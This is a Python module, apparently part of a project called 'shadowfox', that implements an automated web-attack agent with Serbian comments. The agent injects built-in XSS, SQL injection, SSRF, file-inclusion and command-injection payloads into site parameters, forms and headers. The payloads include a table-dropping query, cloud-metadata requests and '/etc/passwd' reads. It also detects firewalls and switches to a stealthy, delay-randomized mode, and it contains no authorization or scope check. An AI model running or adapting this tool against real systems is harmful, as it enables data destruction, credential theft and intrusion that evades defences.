# shadowfox/agents/smart_shadow_agent.py

import requests
import random
import time
import json
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import Dict, List, Any, Optional, Tuple
import concurrent.futures
from datetime import datetime
import logging
import hashlib
from collections import defaultdict

class SmartShadowAgent:
    """
    SmartShadowAgent - AI-driven agent koji pametno izvršava napade
    Koristi heuristiku, adaptivno učenje i kontekstualnu analizu
    """
    
    def __init__(self, operator, mutation_engine=None):
        self.operator = operator
        self.mutation_engine = mutation_engine
        self.logger = logging.getLogger('SmartShadowAgent')
        
        # Session sa pool-om konekcija
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10, 
            pool_maxsize=20,
            max_retries=3
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        # AI heuristika i učenje
        self.success_patterns = defaultdict(list)  # Patterns koji su uspešni
        self.failure_patterns = defaultdict(list)  # Patterns koji nisu
        self.context_memory = {}  # Pamti kontekst po target-u
        self.payload_effectiveness = defaultdict(float)  # Efikasnost payload-a
        
        # Adaptivni parametri
        self.current_strategy = "balanced"  # balanced, aggressive, stealth
        self.confidence_threshold = 0.7
        self.max_requests_per_endpoint = 50
        self.adaptive_delay = 1.0
        
        # Detektori odgovora
        self.success_indicators = [
            # XSS indikatori
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
            r'alert\s*\(',
            r'prompt\s*\(',
            r'confirm\s*\(',
            
            # SQLi indikatori
            r'mysql_fetch',
            r'ORA-\d+',
            r'Microsoft.*ODBC.*SQL',
            r'PostgreSQL.*ERROR',
            r'Warning.*mysql_',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'Column count doesn\'t match',
            
            # SSRF indikatori
            r'Connection refused',
            r'Name or service not known',
            r'Connection timeout',
            r'Internal Server Error.*curl',
            
            # LFI/RFI indikatori
            r'root:x:0:0:',
            r'\[boot loader\]',
            r'<\?php',
            r'Warning.*include',
            r'No such file or directory',
            
            # Command Injection
            r'uid=\d+.*gid=\d+',
            r'Microsoft Windows \[Version',
            r'total \d+',
            r'drwxr-xr-x',
            
            # Generic error patterns
            r'Fatal error',
            r'Parse error',
            r'Warning:',
            r'Notice:',
            r'Undefined variable',
            r'Call to undefined function'
        ]
        
        # Greške koje ukazuju na filtriranje
        self.filter_indicators = [
            r'blocked',
            r'forbidden',
            r'not allowed',
            r'filtered',
            r'suspicious',
            r'malicious',
            r'attack detected',
            r'security violation',
            r'waf',
            r'firewall'
        ]
    
    def attack_target(self, target_data: Dict, attack_types: List[str] = None) -> Dict:
        """
        Glavna funkcija za napad na target sa AI heuristikom
        """
        if not attack_types:
            attack_types = ["XSS", "SQLi", "SSRF", "LFI", "CommandInjection"]
        
        self.logger.info(f"SmartShadow počinje napad na {target_data.get('target_url')}")
        
        # Inicijalizuj kontekst za ovaj target
        target_hash = self._get_target_hash(target_data["target_url"])
        self.context_memory[target_hash] = {
            "start_time": datetime.now(),
            "requests_made": 0,
            "successful_patterns": [],
            "failed_patterns": [],
            "detected_waf": False,
            "response_times": [],
            "error_patterns": []
        }
        
        attack_results = {
            "target_url": target_data["target_url"],
            "attack_types": attack_types,
            "total_requests": 0,
            "successful_attacks": 0,
            "potential_vulns": [],
            "strategy_changes": [],
            "ai_insights": {},
            "execution_time": 0
        }
        
        start_time = time.time()
        
        try:
            # Analiziraj target i prilagodi strategiju
            self._analyze_target_context(target_data)
            
            # Za svaki tip napada
            for attack_type in attack_types:
                self.logger.info(f"Počinje {attack_type} testiranje")
                
                # Dinamički generiši payload-e za ovaj kontekst
                payloads = self._generate_smart_payloads(attack_type, target_data)
                
                # Testiraj payload-e sa AI heuristikom
                type_results = self._execute_smart_attack(
                    target_data, attack_type, payloads
                )
                
                attack_results["total_requests"] += type_results["requests_made"]
                attack_results["successful_attacks"] += type_results["successful_count"]
                attack_results["potential_vulns"].extend(type_results["vulnerabilities"])
                
                # Adaptiraj strategiju na osnovu rezultata
                self._adapt_strategy(type_results)
            
            # AI analiza rezultata
            attack_results["ai_insights"] = self._generate_ai_insights(target_hash)
            attack_results["execution_time"] = time.time() - start_time
            
            # Loguj rezultate
            self.operator.log_agent_action("SmartShadowAgent", "attack_completed", {
                "total_requests": attack_results["total_requests"],
                "successful_attacks": attack_results["successful_attacks"],
                "strategy_used": self.current_strategy,
                "ai_confidence": attack_results["ai_insights"].get("confidence", 0)
            })
            
        except Exception as e:
            self.logger.error(f"Greška u SmartShadow napadu: {e}")
            attack_results["error"] = str(e)
        
        return attack_results
    
    def _get_target_hash(self, url: str) -> str:
        """Generiše hash za target (za context memory)"""
        return hashlib.md5(urlparse(url).netloc.encode()).hexdigest()[:8]
    
    def _analyze_target_context(self, target_data: Dict):
        """
        Analizira kontekst targeta i prilagođava početnu strategiju
        """
        # Analiziraj tehnologije
        technologies = target_data.get("technologies", {})
        headers = target_data.get("headers", {})
        
        # Detektuj WAF/zaštitu
        server_header = headers.get("all_headers", {}).get("server", "").lower()
        security_headers = headers.get("security_headers", {})
        
        waf_indicators = ["cloudflare", "incapsula", "sucuri", "akamai", "barracuda"]
        detected_waf = any(indicator in server_header for indicator in waf_indicators)
        
        if detected_waf or len([h for h in security_headers.values() if h]) > 3:
            self.current_strategy = "stealth"
            self.adaptive_delay = random.uniform(2.0, 4.0)
            self.logger.info("Detektovana zaštićena aplikacija - prelazim na stealth strategiju")
        elif "PHP" in technologies and "WordPress" in technologies:
            self.current_strategy = "aggressive"
            self.adaptive_delay = 0.5
            self.logger.info("WordPress/PHP detektovan - aggressive strategija")
        else:
            self.current_strategy = "balanced"
            self.adaptive_delay = 1.0
    
    def _generate_smart_payloads(self, attack_type: str, target_data: Dict) -> List[Dict]:
        """
        Generiše pametne payload-e na osnovu konteksta i prethodnih iskustava
        """
        base_payloads = self.operator.get_payloads_by_type(attack_type)
        
        # Ako nema base payload-a, koristi ugrađene
        if not base_payloads:
            base_payloads = self._get_builtin_payloads(attack_type)
        
        smart_payloads = []
        technologies = target_data.get("technologies", {})
        
        for payload_data in base_payloads:
            payload = payload_data.get("payload", payload_data) if isinstance(payload_data, dict) else payload_data
            
            # Osnovni payload
            smart_payloads.append({
                "payload": payload,
                "priority": self._calculate_payload_priority(payload, attack_type, technologies),
                "context": "base",
                "expected_indicators": self._get_expected_indicators(attack_type)
            })
            
            # Generiši varijacije ako imamo mutation engine
            if self.mutation_engine:
                mutations = self.mutation_engine.mutate_payload(payload, attack_type)
                for mutation in mutations[:3]:  # Ograniči na 3 mutacije po payload-u
                    smart_payloads.append({
                        "payload": mutation,
                        "priority": self._calculate_payload_priority(mutation, attack_type, technologies) * 0.8,
                        "context": "mutation",
                        "expected_indicators": self._get_expected_indicators(attack_type)
                    })
        
        # Sortiraj po prioritetu
        smart_payloads.sort(key=lambda x: x["priority"], reverse=True)
        
        # Ograniči broj payload-a na osnovu strategije
        if self.current_strategy == "stealth":
            return smart_payloads[:20]
        elif self.current_strategy == "aggressive":
            return smart_payloads[:100]
        else:
            return smart_payloads[:50]
    
    def _calculate_payload_priority(self, payload: str, attack_type: str, technologies: Dict) -> float:
        """
        Izračunava prioritet payload-a na osnovu konteksta i prethodnih iskustava
        """
        priority = 0.5  # Bazni prioritet
        
        # Prioritet na osnovu tehnologija
        if attack_type == "XSS":
            if "JavaScript" in technologies:
                priority += 0.3
            if "React" in technologies or "Angular" in technologies:
                priority += 0.2
        elif attack_type == "SQLi":
            if "PHP" in technologies:
                priority += 0.3
            if "MySQL" in str(technologies):
                priority += 0.2
        
        # Prioritet na osnovu prethodnih iskustava
        payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
        if payload_hash in self.payload_effectiveness:
            priority += self.payload_effectiveness[payload_hash] * 0.4
        
        # Redukcija prioriteta za složene payload-e u stealth modu
        if self.current_strategy == "stealth" and len(payload) > 100:
            priority *= 0.7
        
        return min(priority, 1.0)
    
    def _execute_smart_attack(self, target_data: Dict, attack_type: str, payloads: List[Dict]) -> Dict:
        """
        Izvršava pametni napad sa adaptivnim učenjem
        """
        results = {
            "attack_type": attack_type,
            "requests_made": 0,
            "successful_count": 0,
            "vulnerabilities": [],
            "patterns_learned": []
        }
        
        # Identify attack surfaces
        attack_surfaces = self._identify_attack_surfaces(target_data, attack_type)
        
        for surface in attack_surfaces:
            for payload_data in payloads:
                if results["requests_made"] >= self.max_requests_per_endpoint:
                    break
                
                # Izvršiti napad
                attack_result = self._execute_single_attack(
                    surface, payload_data, attack_type
                )
                
                results["requests_made"] += 1
                
                if attack_result["success"]:
                    results["successful_count"] += 1
                    results["vulnerabilities"].append(attack_result)
                    
                    # Uči iz uspešnog napada
                    self._learn_from_success(payload_data["payload"], attack_result)
                else:
                    # Uči iz neuspešnog napada
                    self._learn_from_failure(payload_data["payload"], attack_result)
                
                # Adaptivni delay
                time.sleep(self.adaptive_delay + random.uniform(0, 0.5))
                
                # Adaptivna promena strategije
                if results["requests_made"] % 10 == 0:
                    self._dynamic_strategy_adjustment(results)
        
        return results
    
    def _identify_attack_surfaces(self, target_data: Dict, attack_type: str) -> List[Dict]:
        """
        Identifikuje moguće attack surface-e na osnovu recon podataka
        """
        surfaces = []
        base_url = target_data["target_url"]
        
        # URL parametri
        parsed = urlparse(base_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                surfaces.append({
                    "type": "url_param",
                    "url": base_url,
                    "parameter": param,
                    "method": "GET",
                    "context": f"URL parameter: {param}"
                })
        
        # Forme
        forms = target_data.get("forms", [])
        for form in forms:
            for input_field in form.get("inputs", []):
                if input_field["type"] not in ["submit", "button", "hidden"]:
                    surfaces.append({
                        "type": "form_input",
                        "url": form["action"],
                        "parameter": input_field["name"],
                        "method": form.get("method", "POST"),
                        "context": f"Form input: {input_field['name']}"
                    })
        
        # Headers (za header injection)
        if attack_type in ["SSRF", "CommandInjection"]:
            common_headers = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP"]
            for header in common_headers:
                surfaces.append({
                    "type": "header",
                    "url": base_url,
                    "parameter": header,
                    "method": "GET",
                    "context": f"Header: {header}"
                })
        
        # Endpoints
        endpoints = target_data.get("endpoints", [])
        for endpoint in endpoints:
            surfaces.append({
                "type": "endpoint",
                "url": endpoint,
                "parameter": None,
                "method": "GET",
                "context": f"Endpoint: {endpoint}"
            })
        
        return surfaces
    
    def _execute_single_attack(self, surface: Dict, payload_data: Dict, attack_type: str) -> Dict:
        """
        Izvršava jedan konkretan napad
        """
        payload = payload_data["payload"]
        result = {
            "success": False,
            "payload": payload,
            "url": surface["url"],
            "method": surface["method"],
            "parameter": surface.get("parameter"),
            "response_code": 0,
            "response_body": "",
            "response_time": 0,
            "indicators_found": [],
            "confidence": 0.0
        }
        
        try:
            start_time = time.time()
            
            if surface["type"] == "url_param":
                # URL parameter injection
                parsed = urlparse(surface["url"])
                params = parse_qs(parsed.query)
                params[surface["parameter"]] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                response = self.session.get(test_url, timeout=10)
                
            elif surface["type"] == "form_input":
                # Form input injection
                data = {surface["parameter"]: payload}
                if surface["method"].upper() == "POST":
                    response = self.session.post(surface["url"], data=data, timeout=10)
                else:
                    response = self.session.get(surface["url"], params=data, timeout=10)
                    
            elif surface["type"] == "header":
                # Header injection
                headers = {surface["parameter"]: payload}
                response = self.session.get(surface["url"], headers=headers, timeout=10)
                
            elif surface["type"] == "endpoint":
                # Endpoint testing
                if payload.startswith("/"):
                    test_url = urljoin(surface["url"], payload)
                else:
                    test_url = f"{surface['url']}/{payload}"
                response = self.session.get(test_url, timeout=10)
            
            result["response_code"] = response.status_code
            result["response_body"] = response.text[:5000]  # Ograniči na 5KB
            result["response_time"] = time.time() - start_time
            
            # Analiziraj odgovor
            success_score = self._analyze_response(
                response.text, response.headers, attack_type, payload_data["expected_indicators"]
            )
            
            if success_score > self.confidence_threshold:
                result["success"] = True
                result["confidence"] = success_score
                result["indicators_found"] = self._extract_indicators(response.text, attack_type)
                
                # Sačuvaj dokaz
                proof_id = self.operator.store_proof(
                    payload=payload,
                    url=surface["url"],
                    payload_type=attack_type,
                    response_code=response.status_code,
                    response_raw=response.text[:2000]
                )
                result["proof_id"] = proof_id
            
        except Exception as e:
            result["error"] = str(e)
            self.logger.debug(f"Greška u napadu: {e}")
        
        return result
    
    def _analyze_response(self, response_text: str, headers: Dict, attack_type: str, expected_indicators: List) -> float:
        """
        AI analiza odgovora za procenu uspešnosti napada
        """
        score = 0.0
        
        # Proveri očekivane indikatore
        for indicator in expected_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                score += 0.3
        
        # Generički success patterns
        for pattern in self.success_indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                score += 0.2
        
        # Proveri da li je blokiran
        for filter_pattern in self.filter_indicators:
            if re.search(filter_pattern, response_text, re.IGNORECASE):
                score -= 0.5
        
        # Analiza HTTP status koda
        if attack_type == "XSS" and "text/html" in str(headers):
            score += 0.1
        elif attack_type == "SQLi" and len(response_text) > 1000:
            score += 0.1
        
        return max(0.0, min(1.0, score))
    
    def _extract_indicators(self, response_text: str, attack_type: str) -> List[str]:
        """Izdvaja konkretne indikatore uspešnog napada"""
        indicators = []
        
        for pattern in self.success_indicators:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            indicators.extend(matches[:3])  # Maksimalno 3 po patternu
        
        return indicators[:10]  # Maksimalno 10 indikatora
    
    def _learn_from_success(self, payload: str, result: Dict):
        """Uči iz uspešnog napada"""
        payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
        self.payload_effectiveness[payload_hash] = min(
            1.0, self.payload_effectiveness[payload_hash] + 0.1
        )
        
        # Zapamti uspešne karakteristike
        self.success_patterns[result.get("response_code", 0)].append(payload[:50])
    
    def _learn_from_failure(self, payload: str, result: Dict):
        """Uči iz neuspešnog napada"""
        payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
        self.payload_effectiveness[payload_hash] = max(
            0.0, self.payload_effectiveness[payload_hash] - 0.05
        )
        
        # Zapamti neuspešne karakteristike
        self.failure_patterns[result.get("response_code", 0)].append(payload[:50])
    
    def _adapt_strategy(self, type_results: Dict):
        """Adaptira strategiju na osnovu rezultata"""
        success_rate = type_results["successful_count"] / max(1, type_results["requests_made"])
        
        if success_rate > 0.3 and self.current_strategy != "aggressive":
            self.current_strategy = "aggressive"
            self.adaptive_delay *= 0.7
            self.logger.info("Visoka stopa uspešnosti - prelazim na aggressive strategiju")
        elif success_rate < 0.05 and self.current_strategy != "stealth":
            self.current_strategy = "stealth"
            self.adaptive_delay *= 1.5
            self.logger.info("Niska stopa uspešnosti - prelazim na stealth strategiju")
    
    def _dynamic_strategy_adjustment(self, results: Dict):
        """Dinamički prilagođava strategiju tokom izvršavanja"""
        if results["requests_made"] > 20:
            recent_success_rate = results["successful_count"] / results["requests_made"]
            
            if recent_success_rate > 0.5:
                self.adaptive_delay = max(0.1, self.adaptive_delay * 0.8)
            elif recent_success_rate < 0.1:
                self.adaptive_delay = min(5.0, self.adaptive_delay * 1.2)
    
    def _generate_ai_insights(self, target_hash: str) -> Dict:
        """Generiše AI insights na osnovu celog napada"""
        context = self.context_memory.get(target_hash, {})
        
        insights = {
            "confidence": 0.0,
            "target_difficulty": "medium",
            "recommended_focus": [],
            "learned_patterns": [],
            "optimization_suggestions": []
        }
        
        # Proceni difficulty na osnovu response times i success rate
        avg_response_time = sum(context.get("response_times", [1])) / len(context.get("response_times", [1]))
        
        if context.get("detected_waf") or avg_response_time > 3.0:
            insights["target_difficulty"] = "hard"
            insights["optimization_suggestions"].append("Consider using stealth techniques")
        elif len(context.get("successful_patterns", [])) > 5:
            insights["target_difficulty"] = "easy"
            insights["optimization_suggestions"].append("Target is vulnerable to multiple attack types")
        
        # Preporuči focus area
        if len(context.get("successful_patterns", [])) > 0:
            insights["recommended_focus"] = ["Continue with successful patterns", "Expand mutation scope"]
        
        insights["confidence"] = min(1.0, len(context.get("successful_patterns", [])) * 0.2)
        
        return insights
    
    def _get_expected_indicators(self, attack_type: str) -> List[str]:
        """Vraća očekivane indikatore za tip napada"""
        indicators = {
            "XSS": [r'<script', r'javascript:', r'alert\(', r'onerror='],
            "SQLi": [r'mysql_', r'ORA-\d+', r'SQL.*error', r'Warning.*mysql'],
            "SSRF": [r'Connection refused', r'timeout', r'Name or service not known'],
            "LFI": [r'root:x:0:0:', r'boot loader', r'include.*failed'],
            "CommandInjection": [r'uid=\d+', r'Microsoft Windows', r'total \d+']
        }
        return indicators.get(attack_type, [])
    
    def _get_builtin_payloads(self, attack_type: str) -> List[str]:
        """Vraća ugrađene payload-e ako nema u bazi"""
        payloads = {
            "XSS": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=javascript:alert('XSS')></iframe>"
            ],
            "SQLi": [
                "' OR '1'='1",
                "' UNION SELECT null,null--",
                "'; DROP TABLE users; --",
                "' OR 1=1#",
                "admin'--",
                "' OR 'x'='x",
                "1' AND 1=1--"
            ],
            "SSRF": [
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "file:///etc/passwd",
                "http://169.254.169.254/latest/meta-data/",
                "gopher://127.0.0.1:25/",
                "dict://localhost:11211/",
                "http://[::1]:22"
            ],
            "LFI": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd%00",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php"
            ],
            "CommandInjection": [
                "; ls -la",
                "| whoami",
                "`id`",
                "$(whoami)",
                "; cat /etc/passwd",
                "& dir",
                "; ping -c 4 127.0.0.1"
            ]
        }
        return payloads.get(attack_type, [])

# Test funkcionalnosti
if __name__ == "__main__":
    from operator import ShadowFoxOperator
    
    # Test setup
    op = ShadowFoxOperator()
    smart_agent = SmartShadowAgent(op)
    
    # Mock target data
    target_data = {
        "target_url": "https://httpbin.org/get?test=1",
        "technologies": {"JavaScript": True, "PHP": True},
        "headers": {"security_headers": {}},
        "forms": [
            {
                "action": "https://httpbin.org/post",
                "method": "POST",
                "inputs": [{"name": "username", "type": "text"}]
            }
        ],
        "endpoints": ["https://httpbin.org/admin"]
    }
    
    mission_id = op.create_mission(target_data["target_url"], "Smart Shadow test")
    results = smart_agent.attack_target(target_data, ["XSS"])
    
    print(json.dumps(results, indent=2, default=str))
